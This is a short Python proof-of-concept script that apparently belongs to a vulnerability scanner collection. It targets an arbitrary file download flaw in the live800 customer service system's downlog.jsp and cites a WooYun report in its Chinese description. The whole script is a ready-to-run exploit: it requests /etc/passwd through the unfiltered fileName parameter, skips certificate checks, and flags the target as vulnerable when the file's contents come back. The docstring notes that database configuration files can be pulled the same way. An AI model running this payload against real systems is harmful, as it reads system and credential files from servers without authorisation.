#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: live800客服系统downlog任意文件下载
referer: http://www.wooyun.org/bugs/wooyun-2010-0147322
author: Lucifer
description: live800客服系统downlog.jsp参数fileName未过滤导致任意文件下载,可下载数据库配置文件
'''
import sys
import requests
import warnings
def run(url):
        result = ['live800客服系统downlog任意文件下载','','']
        payload = "/live800/downlog.jsp?path=/&fileName=/etc/passwd"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"root:" in req.text and r"/bin/bash" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
